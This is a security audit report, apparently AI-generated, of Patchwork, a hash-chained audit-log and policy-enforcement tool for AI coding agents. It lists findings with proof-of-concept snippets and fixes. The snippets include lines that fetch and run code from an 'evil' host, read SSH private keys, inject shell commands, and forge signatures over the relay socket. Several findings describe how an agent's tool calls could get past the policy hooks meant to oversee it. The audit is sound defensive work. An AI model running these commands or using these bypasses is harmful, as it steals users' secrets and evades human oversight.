# Patchwork Security Audit — GPT-5.5

**Date:** 2026-05-01
**Reviewer:** OpenAI gpt-5.5 via aiorch ask
**Cost:** $1.36 total (well under $10 budget)
**Files reviewed:** 25 (~6,800 LOC across hash, schema, policy, relay, agents)

**Total findings:** 28 (2 CRITICAL, 11 HIGH, 13 MEDIUM, 2 LOW)

---

## PASS 1 — Cryptographic core (hash, schema, store, in-toto)

### CRITICAL packages/core/src/hash/chain.ts:165 — Stripping `event_hash` disables integrity verification
**What:** `verifyChain()` treats any event without `event_hash` as a “legacy” event and leaves `is_valid` as `true`. `verifyEventHashes()` has the same behavior for missing hashes. An attacker who can edit the log can remove `event_hash`/`prev_hash` from tampered events and they are no longer hash-checked or link-checked.

**Impact:** Full audit-log forgery/truncation/tampering can pass verification if consumers trust `is_valid`. A chained log can be downgraded to “legacy” by deleting hash fields.

**PoC / repro:**
```ts
import { verifyChain } from "./hash/chain.js";

const forged = [{
  id: "e1",
  session_id: "s",
  timestamp: "2026-01-01T00:00:00.000Z",
  agent: "custom",
  action: "command_execute",
  risk: { level: "none" }
  // no event_hash, no prev_hash
}];

console.log(verifyChain(forged));
// is_valid: true, legacy_events: 1
```

**Fix:** Reject missing hashes in current logs: `if (!eventHash) { result.legacy_events++; result.is_valid = false; ... }` or require an explicit trusted legacy-mode flag outside attacker-controlled data.

---

### HIGH packages/core/src/hash/seal.ts:129 — `key_id` path traversal in keyring lookup
**What:** `loadKeyById(keyringDir, keyId)` builds the key path with `join(keyringDir, \`${keyId}.key\`)` without validating that `keyId` is a safe basename. A malicious seal/attestation `key_id` like `../../tmp/known` escapes the keyring.

**Impact:** If verification loads keys by untrusted `key_id`, an attacker can make Patchwork use an attacker-known file as the HMAC key and forge valid seals/attestations.

**PoC / repro:**
```ts
import { writeFileSync } from "node:fs";
import { loadKeyById, signSeal, computeSealPayload } from "./hash/seal.js";

writeFileSync("/tmp/known.key", "attacker-known-key");

const key = loadKeyById("/home/user/.patchwork/keys", "../../tmp/known");
// reads /tmp/known.key

const payload = computeSealPayload("sha256:fake", 1, "2026-01-01T00:00:00.000Z");
const sig = signSeal(payload, key);
// attacker can now produce a seal with key_id="../../tmp/known"
```

**Fix:** Validate key IDs before path construction: `if (!/^[a-f0-9]{16}$/.test(keyId)) throw new Error("invalid key_id");`.

---

### HIGH packages/core/src/store/jsonl.ts:373 — Live locks are reclaimed after 5s, causing concurrent writers
**What:** `isLockStale()` returns stale when `Date.now() - meta.created_at_ms > thresholdMs` even if the same-host PID is still alive. Any append critical section lasting over `LOCK_STALE_THRESHOLD_MS` can have its lock deleted by another process.

**Impact:** Two writers can enter the append critical section concurrently, compute the same `prev_hash`, and create a forked/broken chain. An attacker can trigger this with a very large log that makes `ensureIndex()` parsing slow.

**PoC / repro:**
1. Create a huge JSONL audit log so `append()` spends >5s in `ensureIndex()`.
2. Start process A appending.
3. Start process B appending after ~5s.
4. Process B considers A’s live lock stale, unlinks it, and appends concurrently.
5. Result: two appended events may share the same previous tip; `verifyChain()` reports link mismatch.

**Fix:** Never age-reclaim locks for live same-host PIDs: after `isProcessAlive(meta.pid)` returns true, return `false`; use a heartbeat field if stuck-process recovery is required.

---

### HIGH packages/core/src/hash/seal.ts:33 — Seal payload is ambiguous colon-delimited encoding
**What:** `computeSealPayload()` concatenates unvalidated fields with `:` delimiters. Because `tipHash` and `sealedAt` are arbitrary strings at this layer, different logical seal records can produce identical HMAC payload bytes.

**Impact:** A valid seal signature can be replayed onto a different `(tip_hash, chained_events, sealed_at)` tuple if the attacker can choose delimiter-containing field values or exploit weak upstream validation.

**PoC / repro:**
```ts
import { computeSealPayload } from "./hash/seal.js";

const a = computeSealPayload("sha256:abc", 7, "x:7:y");
const b = computeSealPayload("sha256:abc:7:x", 7, "y");

console.log(a === b); // true
```

**Fix:** Replace delimiter concatenation with length-prefixed or canonical JSON encoding, e.g. `canonicalize({ protocol:"patchwork-seal:v1", tipHash, chainedEvents, sealedAt })`.

---

### MEDIUM packages/core/src/schema/event.ts:78 — `action` is unconstrained despite defined allowlist
**What:** `AllActions` enumerates valid actions, but `AuditEventSchema` uses `action: z.string()` instead of an enum/refinement.

**Impact:** Attackers or buggy agents can create schema-valid, hash-valid events with misspelled or malicious action names that evade action-based policy, reporting, filtering, and risk summaries.

**PoC / repro:**
```ts
import { AuditEventSchema } from "./schema/event.js";

AuditEventSchema.parse({
  id: "e1",
  session_id: "s",
  timestamp: "2026-01-01T00:00:00.000Z",
  agent: "custom",
  action: "command_execute\u0000hidden",
  risk: { level: "none" }
}); // succeeds
```

**Fix:** Use the allowlist: `action: z.enum(AllActions as [Action, ...Action[]])`.

---

### MEDIUM packages/core/src/store/jsonl.ts:253 — Corrupt/invalid lines are silently omitted from normal reads
**What:** `parseFile()` skips invalid JSON/schema-invalid lines and returns only valid events; `readAll()`/`query()` expose the filtered result and only set `lastReadErrors`.

**Impact:** A tampered event can be hidden from normal audit views by corrupting one line. Unless every caller checks `lastReadErrors` or runs `verifyChain()`, the UI/API may present an incomplete audit trail as if it were complete.

**PoC / repro:**
```jsonl
{"id":"safe","session_id":"s","timestamp":"2026-01-01T00:00:00.000Z","agent":"custom","action":"file_read","risk":{"level":"none"}}
{"id":"evil","session_id":"s","timestamp":"2026-01-01T00:00:01.000Z","agent":"custom","action":"command_execute","risk":{"level":"critical"}
```
The second line is truncated. `readAll()` returns only the first event.

**Fix:** Make reads fail closed: throw on any parse/schema error, or return `{ events, errors }` and require callers to handle nonzero errors.

---

### MEDIUM packages/core/src/attestation/intoto.ts:177 — DSSE verification accepts non-canonical/malformed base64 payloads
**What:** `Buffer.from(envelope.payload, "base64")` is permissive in Node and ignores many invalid characters. `verifyDsseEnvelope()`, `decodeStatement()`, and `digestStatement()` do not reject malformed or non-canonical base64.

**Impact:** DSSE envelopes are malleable: different serialized envelopes can verify to the same decoded payload/signature. This can break transparency-log identity, cache keys, or audit comparisons that hash/store the envelope bytes.

**PoC / repro:**
```ts
const env2 = { ...env, payload: env.payload + "!!!!" };

await verifyDsseEnvelope(env2, verifyFn); // can still return true
digestStatement(env2) === digestStatement(env); // same decoded bytes
```

**Fix:** Before decoding, enforce canonical base64: reject if `!/^[A-Za-z0-9+/]*={0,2}$/.test(payload)` or if `Buffer.from(payload, "base64").toString("base64") !== payload`.

---

### MEDIUM packages/core/src/schema/commit-attestation.ts:11 — Commit attestations do not validate git commit identity
**What:** `commit_sha` and `branch` are unconstrained strings. `buildInTotoStatement()` then places them directly into the in-toto subject name/digest.

**Impact:** Patchwork can emit schema-valid, signed attestations whose subject digest is not a real git commit SHA, weakening supply-chain verifier assumptions and enabling misleading attestations.

**PoC / repro:**
```ts
CommitAttestationSchema.parse({
  schema_version: 1,
  type: "commit-attestation",
  generated_at: "2026-01-01T00:00:00.000Z",
  tool_version: "x",
  commit_sha: "not-a-sha",
  branch: "main\nmalicious",
  project_root: "/repo",
  session_id: "s",
  session_events_count: 0,
  session_events_since_last_commit: 0,
  chain_tip_hash: null,
  chain_valid: true,
  chain_chained_events: 0,
  risk_summary: { critical:0, high:0, medium:0, low:0, none:0, denials:0 },
  policy_source: "default",
  pass: true,
  failure_reasons: [],
  payload_hash: "x",
  signature: "x"
}); // succeeds
```

**Fix:** Add strict refinements: `commit_sha: z.string().regex(/^[0-9a-f]{40}$|^[0-9a-f]{64}$/i)` and reject control characters in `branch`.

---

### LOW packages/core/src/hash/witness.ts:88 — Untrusted witness text is reflected into error messages
**What:** `validateWitnessResponse()` embeds `resp.witnessed_at` directly into an error string.

**Impact:** If errors are logged to terminals, CI annotations, or HTML without escaping, a malicious witness can inject control characters or markup into logs.

**PoC / repro:**
```ts
validateWitnessResponse(
  { anchor_id: "a", witnessed_at: "\x1b[31mFAKE ERROR\x1b[0m" },
  "https://witness",
  "sha256:x",
  1,
  "hmac-sha256:x"
);
// error contains raw ANSI escape bytes
```

**Fix:** Escape/control-strip reflected values, e.g. `JSON.stringify(resp.witnessed_at).replace(/\p{C}/gu, "")`.

---

### LOW packages/core/src/hash/attestation.ts:3 — `payload_hash` is not signed
**What:** `buildAttestationPayload()` excludes `payload_hash` from the signed payload. An attacker can alter `payload_hash` without invalidating `signature`.

**Impact:** If downstream systems use `payload_hash` as an identifier, lookup key, or integrity indicator without recomputing it, they can be misled while the HMAC signature still verifies.

**PoC / repro:**
```ts
const signed = { ...attestation };
signed.payload_hash = "sha256:attacker-controlled";
// buildAttestationPayload(signed) is unchanged, so signature verification still passes
```

**Fix:** Either sign `payload_hash`, or remove it from stored attestations and always recompute it from `buildAttestationPayload()` during verification.

---

### No findings
- **DSSE PAE length encoding:** `dssePAE()` correctly uses byte lengths and signs raw payload bytes, not base64.
- **Format-string injection in JSON serialization:** event serialization uses `JSON.stringify`; no classic format-string sink is present.
- **File path traversal when writing attestations:** no attestation-writing filesystem code is present in the provided files.

## Overall posture

- The hash-chain design is undermined by fail-open legacy handling: removing hash fields can turn tampered data into “valid” legacy events.
- Key management and locking need hardening: unvalidated `key_id` path construction and stale-lock reclamation can directly affect signature trust and chain correctness.
- Schema validation is too permissive for security-critical records; constrain actions, hashes, signatures, commit SHAs, counts, URLs, and key IDs with strict formats.


---

## PASS 2 — Hooks, policy, relay daemon

## Policy / hook enforcement findings

### [HIGH] packages/core/src/policy/engine.ts:274 — Command allow/deny rules are prefix checks over shell strings
**What:** `matchesCommandRule()` treats `prefix` as `command.toLowerCase().startsWith(prefix)`. This is not shell-aware and approves compound commands, wrappers, aliases, env assignments, and subshells.  
**Impact:** A policy with `commands.default_action: deny` and `allow: [{prefix: "git status"}]` allows `git status && curl https://evil/sh | sh`. A deny rule for `curl` is bypassed with `env curl ...`, `/usr/bin/curl ...`, `bash -lc 'curl ...'`, `command curl ...`, etc.  
**PoC / repro:** Configure `commands.default_action: deny`, `allow: [{ prefix: "git status", action: "allow" }]`, then run Claude Bash tool: `git status && cat ~/.ssh/id_rsa`. Patchwork allows because the string starts with `git status`.  
**Fix:** Replace prefix matching for shell commands with a shell parser/AST and only allow exact argv forms; reject compound operators `;`, `&&`, `||`, pipes, command substitution, redirection, and shell wrappers unless explicitly allowed.

### [HIGH] packages/agents/src/claude-code/mapper.ts:17 — Unvalidated tool input can crash PreToolUse and skip policy
**What:** The mapper blindly casts untrusted `toolInput` fields to `string`. `classifyRisk()` and `matchesGlob()` then call string methods like `.trim()` / `.replace()` on those values. Non-string JSON values can throw during PreToolUse.  
**Impact:** In default/audit deployments where hook failures do not fail closed, a malformed tool call can make the enforcement hook error out and the underlying tool call proceeds without policy evaluation.  
**PoC / repro:** Send a Claude hook payload for `Write` with `tool_input.file_path = {"x":1}` or `Bash` with `tool_input.command = {"x":1}`. `matchesGlob(filePath, pattern)` or `target.command.trim()` throws.  
**Fix:** Validate all hook payloads with zod before mapping; if required fields are missing/non-string, return a deterministic denied PreToolUse result.

### [HIGH] packages/core/src/risk/sensitive.ts:39 / packages/core/src/policy/engine.ts:216 — Sensitive-path checks do not resolve symlinks or dot segments
**What:** File policy and sensitive classification match raw tool-provided paths after only backslash replacement. They do not `realpath`, normalize `..`, or check symlink targets.  
**Impact:** A denied sensitive target can be read/written through a benign-looking symlink or path alias, bypassing both risk escalation and file deny rules.  
**PoC / repro:** In a repo: `ln -s ~/.ssh/id_rsa ./README.md`; policy denies `**/.ssh/*`; ask Claude to `Read` `README.md`. Patchwork sees `README.md`, not `~/.ssh/id_rsa`, so the deny rule does not match. Similarly, `safe/../secrets/token` may bypass `secrets/**`.  
**Fix:** Before classification and policy evaluation, resolve paths against `cwd` with `realpathSync.native`; evaluate both lexical normalized path and real path, and reject symlinks for denied-sensitive classes.

### [MEDIUM] packages/core/src/policy/engine.ts:198 — `path` wins over `abs_path`, enabling mixed-target bypasses
**What:** `const filePath = input.target?.path || input.target?.abs_path;` trusts `path` if present and ignores `abs_path`.  
**Impact:** Any adapter or MCP bridge that supplies both a benign `path` and a sensitive `abs_path` will have policy evaluated against the benign value.  
**PoC / repro:** Call `evaluatePolicy()` with `target: {type:"file", path:"README.md", abs_path:"/home/user/.ssh/id_rsa"}` and a deny rule for `**/.ssh/*`; it evaluates only `README.md`.  
**Fix:** Evaluate all provided path fields; deny if any normalized/real path matches a deny rule.

### [MEDIUM] packages/core/src/policy/engine.ts:344 — Network `url_prefix` matching is raw string prefix matching
**What:** `rule.url_prefix` uses `url.startsWith(rule.url_prefix)` without URL parsing or origin normalization.  
**Impact:** Allow policies can be bypassed with lookalike hosts.  
**PoC / repro:** Policy allows `url_prefix: "https://api.github.com"`. `WebFetch` to `https://api.github.com.evil.tld/steal` is allowed because it starts with the trusted prefix.  
**Fix:** Parse URLs and compare normalized `protocol`, `hostname`, and path boundaries; require prefix rules to end on `/` or origin boundary.

### [MEDIUM] packages/core/src/policy/engine.ts:403 — MCP server allow rules are substring-matchable
**What:** `matchesMcpRule()` accepts `toolName.includes("__${server}__")`. It does not parse the MCP tool name into exact server/tool components.  
**Impact:** With `mcp.default_action: deny` and `allow: [{server:"github"}]`, an attacker-controlled server/tool name containing `__github__` can inherit GitHub permissions.  
**PoC / repro:** Tool name `mcp__evil__github__delete_everything` matches server `github` because it contains `__github__`.  
**Fix:** Parse with a strict regex like `^mcp__([^_][^]*?)__(.+)$` and compare the captured server exactly; do not use `includes()`.

### [MEDIUM] packages/core/src/policy/loader.ts:39 — System policy path override is honored in production
**What:** `getSystemPolicyPath()` trusts `PATCHWORK_SYSTEM_POLICY_PATH`. Because system policy has highest priority, an environment override can replace a real user policy with an attacker-controlled permissive “system” policy.  
**Impact:** Any attacker able to influence the Claude/Patchwork process environment can bypass user/project enforcement.  
**PoC / repro:** Start Claude with `PATCHWORK_SYSTEM_POLICY_PATH=/tmp/allow.yml`, where `/tmp/allow.yml` permits all commands. Patchwork loads it as `system:/tmp/allow.yml` and ignores the user policy.  
**Fix:** Only honor `PATCHWORK_SYSTEM_POLICY_PATH` under `NODE_ENV=test` or require the override target to be root-owned and not group/world-writable.

---

## Relay daemon findings

### [CRITICAL] packages/core/src/relay/daemon.ts:169 / packages/core/src/relay/daemon.ts:478 — World-writable socket lets any local user sign arbitrary data with the root key
**What:** The relay socket is chmod `0777`, and `processMessage()` accepts unauthenticated `sign` requests. `handleSign()` signs arbitrary caller-supplied `payload.data` with the root-owned keyring.  
**Impact:** Any local user can mint signatures that appear to come from Patchwork’s root-owned signing key, including forged commit attestations, forged seals, or arbitrary external claims.  
**PoC / repro:**  
```sh
printf '%s\n' '{"protocol_version":1,"type":"sign","timestamp":"x","payload":{"data":"forged attestation payload"}}' \
  | nc -U /Library/Patchwork/relay.sock
```
The daemon returns a valid `hmac-sha256:*` signature and key id.  
**Fix:** Remove public signing from the relay or require peer-credential authorization (`SO_PEERCRED`/`LOCAL_PEERCRED`) plus a nonce-scoped protocol that signs only daemon-generated seal/attestation payloads.

### [HIGH] packages/core/src/relay/daemon.ts:169 / packages/core/src/relay/daemon.ts:280 — World-writable socket allows unauthenticated audit-log poisoning
**What:** Any local user can send `type:"event"` messages. The daemon validates schema/hash consistency but does not authenticate the sender or bind events to the actual agent process/user.  
**Impact:** Attackers can append forged events to the root-owned relay log, advance the relay hash chain, create fake denials/approvals, or bury real activity in noise.  
**PoC / repro:** Copy any valid event JSON from `events.jsonl`, adjust fields, recompute or omit the event hash if schema permits, then send it as a relay `event` over `/Library/Patchwork/relay.sock`.  
**Fix:** Authenticate clients with Unix peer credentials and allow only the installed hook binary/user; include verified uid/pid metadata in `_relay`.

### [HIGH] packages/core/src/relay/signing-proxy.ts:50 — Root-signing silently downgrades to user-controlled local keys
**What:** `requestSignature()` falls back to `~/.patchwork/keys/seal` when the relay is absent/unreachable. Commit attestations continue to be produced with `signature_source: "local"`.  
**Impact:** An attacker who blocks/removes the relay socket can obtain attestations signed by a key they control unless verifiers strictly reject local signatures. This weakens the claimed root-owned non-repudiation model.  
**PoC / repro:** Stop the relay or point `relaySocketPath` to a nonexistent socket, then commit. The attestation is still signed using the user keyring.  
**Fix:** For compliance attestations, make relay signing mandatory by default; require an explicit `--allow-local-signing` mode and mark local signatures unverifiable for root-trust workflows.

### [MEDIUM] packages/core/src/relay/daemon.ts:326 — Relay log writes do not protect against symlink/hardlink replacement
**What:** The daemon uses `appendFileSync(this.logPath, ...)` and only chmod/chowns when the file is new. It does not open with `O_NOFOLLOW`, verify ownership/mode on every write, or hold an fd opened during startup.  
**Impact:** If `/Library/Patchwork` or the log path is ever made writable/misconfigured, a local attacker can replace the log with a symlink/hardlink target and make the root daemon append to an unintended file.  
**PoC / repro:** In a writable test deployment, replace `events.relay.jsonl` with a symlink to another file before the daemon appends.  
**Fix:** At startup, `lstat` and reject symlinks; open the log with `openSync(path, O_APPEND|O_CREAT|O_NOFOLLOW, 0644)`, verify uid/gid/mode, and write through the held fd.

---

## Auto-seal / commit attestation findings

### [HIGH] packages/core/src/relay/daemon.ts:429 — Auto-seal loses events that arrive while witness publishing is in flight
**What:** `runAutoSealCycle()` seals a snapshot, then awaits witness publishing. If new events are processed during that await, the code sets `lastSealEventCount = this.state.eventCount` instead of `result.seal.chained_events`.  
**Impact:** Events appended during witness publishing are marked as already sealed even though the seal’s `chained_events`/`tip_hash` does not cover them. They may never be sealed.  
**PoC / repro:** Configure a witness endpoint that sleeps 10s. Trigger auto-seal, append events during the witness POST delay, then inspect state: `lastSealEventCount` advances past `result.seal.chained_events`.  
**Fix:** Set `lastSealEventCount = result.seal.chained_events` and `lastSealAt` from `result.seal.sealed_at`; also log if current count exceeds sealed count.

### [MEDIUM] packages/core/src/relay/daemon.ts:407 — Auto-seal has no reentrancy lock
**What:** `setInterval()` can start another `runAutoSealCycle()` while a previous cycle is still awaiting witnesses.  
**Impact:** Duplicate or out-of-order seals can be emitted for stale tips, and state updates race logically even though JS is single-threaded.  
**PoC / repro:** Set interval to 1 minute and witness timeout/delay above 1 minute; observe overlapping seal cycles.  
**Fix:** Add an `autoSealInProgress` boolean/mutex and skip or queue cycles while one is running.

### [HIGH] packages/agents/src/claude-code/commit-attestor.ts:54 — Current commit is treated as “last commit”, so pre-commit denials are ignored
**What:** `generateCommitAttestation()` is called after the current successful git commit event is appended. `findLastCommitEventIndex(sessionEvents)` finds that current commit, so `sinceLastCommitEvents = sessionEvents.slice(current+1)` is empty.  
**Impact:** High-risk denials immediately before a commit do not fail the commit attestation. Unsafe sessions can receive `PASS`.  
**PoC / repro:** In one session, trigger a denied high-risk action, then run `git commit`. The generated attestation reports `denials_high_risk_since_last_commit: 0` because it slices after the current commit event.  
**Fix:** Exclude the current commit event when searching for the previous commit, e.g. search `sessionEvents.slice(0, -1)` or pass the current event id and find the previous matching commit.

---

## Adapter / installer / process invocation findings

### [HIGH] packages/agents/src/claude-code/installer.ts:143 — Hook command quoting is shell-injectable
**What:** `quote()` wraps paths in double quotes but does not escape `"`, `$`, backticks, or command substitutions. Environment option values such as `pretoolTelemetryFile` are inserted unquoted. Claude runs these hook commands through a shell.  
**Impact:** A malicious install path, bin path, or telemetry file option can execute arbitrary shell commands every time Claude fires a hook.  
**PoC / repro:** Install with `binPath` containing `$(touch /tmp/pwn)` or `--pretool-telemetry-file 'x; touch /tmp/pwn #'`. The generated settings command executes the injected shell syntax.  
**Fix:** Shell-quote every interpolated value with single-quote escaping, including env values, or avoid shell strings entirely by using a wrapper script with fixed argv.

### [MEDIUM] packages/agents/src/claude-code/installer.ts:238 — Project installer follows repo-controlled symlinks for settings writes
**What:** For project installs, the code writes `join(projectPath, ".claude", "settings.json")` without checking whether `.claude` or `settings.json` is a symlink.  
**Impact:** A malicious repository can cause `patchwork init` to overwrite an arbitrary user-writable file outside the project.  
**PoC / repro:** Repo contains `.claude -> ~/.config/someapp`; running project install writes `~/.config/someapp/settings.json`.  
**Fix:** Resolve `realpath` for the project and parent directory, refuse symlinks in `.claude`/`settings.json`, and ensure the final real path remains under the project root before writing.

### [MEDIUM] packages/agents/src/claude-code/commit-attestor.ts:171 — Exported git-note helpers shell out with unquoted commit SHA
**What:** `addGitNote()` and `addIntotoGitNote()` build a shell command with `${attestation.commit_sha}` / `${commitSha}` unquoted. Mainline parsed SHAs are hex-safe, but the exported functions accept arbitrary caller-provided values.  
**Impact:** Any internal/plugin caller passing an unvalidated commit id can execute shell commands.  
**PoC / repro:** Call `addGitNote({ commit_sha: "HEAD; touch /tmp/pwn #", ... }, repo)`.  
**Fix:** Use `execFileSync("git", ["notes", "--ref=patchwork", "add", "-f", "-m", noteBody, commitSha], ...)` and validate commit ids with `/^[a-f0-9]{7,40}$/i`.

### [MEDIUM] packages/agents/src/claude-code/commit-attestor.ts:144 — Attestation filename uses unvalidated commit SHA
**What:** `writeCommitAttestation()` writes to `join(commitAttestationsDir(), `${attestation.commit_sha}.json`)` without validating or basename-normalizing `commit_sha`.  
**Impact:** A malicious caller can path-traverse and write arbitrary `*.json` files under the user’s home-writable area.  
**PoC / repro:** Call `writeCommitAttestation({ commit_sha: "../../state/pwn", ... })`; it writes outside `commit-attestations`.  
**Fix:** Validate `commit_sha` as hex before path construction and reject any value containing path separators.

---

## Overall posture

- The largest issue is the relay: a root-key signing oracle on a `0777` socket destroys the trust boundary for root-owned attestations and seals.
- Policy enforcement is mostly string/glob based; without realpath resolution, schema validation, and shell-aware command parsing, practical bypasses are straightforward.
- Commit/auto-seal integrity has timing bugs: current commits can mask prior denials, and events arriving during witness publication can be marked sealed without being covered by the seal.
